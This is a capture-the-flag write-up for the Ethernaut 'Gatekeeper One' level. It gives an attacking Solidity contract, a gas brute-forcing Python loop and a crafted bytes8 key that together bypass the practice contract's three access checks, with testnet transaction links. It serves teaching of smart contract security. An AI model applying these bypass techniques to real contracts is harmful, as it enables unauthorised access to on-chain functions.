# Gatekeeper One

## Objectives

Make it past the gatekeeper and register as an entrant to pass this level.

## Solution

This contract has 3 modifiers that must be passed in order to make `entrant` the origin of the tx (my address).

1. The transaction calling `enter()` in GatekeeperOne has to be performed by a smart contract, so that `msg.sender` differs from `tx.origin` (address calling the contract that calls `enter()`).
   
2. The remaining gas (`gasleft()`) after the code as ran has to be a multiple of 8191. This can be done my performing an external call to the GatekeeperOne contract where we run the `enter()` function and additionally send both the gas needed to perform the instructions *and* a multiple of 8191. I coded it as follows:

```js
(success,) = address(gko).call{
            gas: additionalGas + 10*8191
        }(abi.encodeWithSignature(
            'enter(bytes8)', 
            _modifiedTxOriginBytes
        ));
```

where:

* `additionalGas` is the gas sent that can vary and 10*8191 is a multiple of 8191
  
* `_modifiedTxOriginBytes` is `tx.origin` modified heavily in order to pass the third check.

3. The check has 3 require statements where we must have a key of type `bytes8` which has certain characteristics in order to pass the require statements. In summary, `_gateKey` will pass if:

* `uint32(uint64(_gateKey))`, `uint16(uint64(_gateKey))` and `uint16(tx.origin)` are equal, but `uint64(_gateKey)` is not.

In order to achieve this, we need to make some changes to `tx.origin` manually:

* Only keep the first 2 bytes: `0x98bCCA1C6023e3F851090e079030da43d9F229d1` --> `0x00000000000000000000000000000000000029d1`

* Add at least one value within the zeros in the 8 byte range so that when we typecast into `uint64`, the second check passes, meaning that we need to add at least one hex number (0-9 or A-F) in any position marked with an X: `0x000000000000000000000000XXXXXXXX000029d1`

## How I did it

1. Code and deploy (at: `0xdcEae9bA04Ddb9Dfd5F9B589A0d8638e739cD01b`) an attacking contract where I create a function that will call `enter()` in the Gatekeeper One smart contract. 
   
The function takes a parameter `address` and then casts it into `uint64` and then into `bytes8` to pass it to `enter()`, as `enter()` takes a `bytes8` parameter.

The second parameter will be a number, it can be a `uint16` as we will deal with small values. This number will be the amount of gas that will be used by instructions in the Gatekeeper One contract call. A multiple of 8191 has to be added to this message call to the amount of additional gas passed through `additionalGas` in order to pass the 2nd check.

```js
function callEnter(address _modifiedTxOrigin, uint16 additionalGas) public returns (bool) {
    // modified tx origin is tx origin with tweaks to pass the require statements in `enter()`
    bytes8 _modifiedTxOriginBytes = bytes8(uint64(_modifiedTxOrigin));
    bool success;

    // send a message call with a specific amount of gas + a multiple of 8191
    (success,) = address(gko).call{
        gas: additionalGas + 10*8191
    }(abi.encodeWithSignature(
        'enter(bytes8)', 
        _modifiedTxOriginBytes
    ));

    // require success
    require(success, 'call failed');

    // return result of the success
    return success;
}
```

2. Modify my address (the `tx.origin`, `0x98bCCA1C6023e3F851090e079030da43d9F229d1`) in order to pass the third check, in this case I used `0x0000000000000000000000000000000A000029d1`. This will pass all checks as described in [solution](#solution).

```python
modified_tx_origin = f"0x{'0'*31}A0000{acc.address[-4:]}"
```

3. In order to find the cost of the instructions, I decided to bruteforce the message call until at least one transaction passed and then annotate the typical cost for it. It ended up usually being `211` or `254`. `bruteforce` is a parameter in my function used to solve the challenge, which if `True` will run the loop and execute 200+ txs to find the correct gas to input into `additionalGas`. Once I have the correct gas value, I input it in the else statement and make `bruteforce=False`.

```python
if bruteforce:
    for i in range(100,300,1):
        try:
            tx = gkoattack.callEnter(modified_tx_origin, i, _from)
            print(f"Correct gas: {i}")
            break
        except:
            continue
else:
    tx = gkoattack.callEnter(modified_tx_origin, 211, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x669160ac98274574e76bbe0128e17e845014bf02f7a58ba956d308871f3ffb96


4. Check if we are `entrant`

```js
entrant_assertion = gatekeeper.entrant() == acc.address
print(f"Address is entrant: {entrant_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x198d705849071054badc7f1648851deb96f216110571ffba7bb87c5f5cb24835
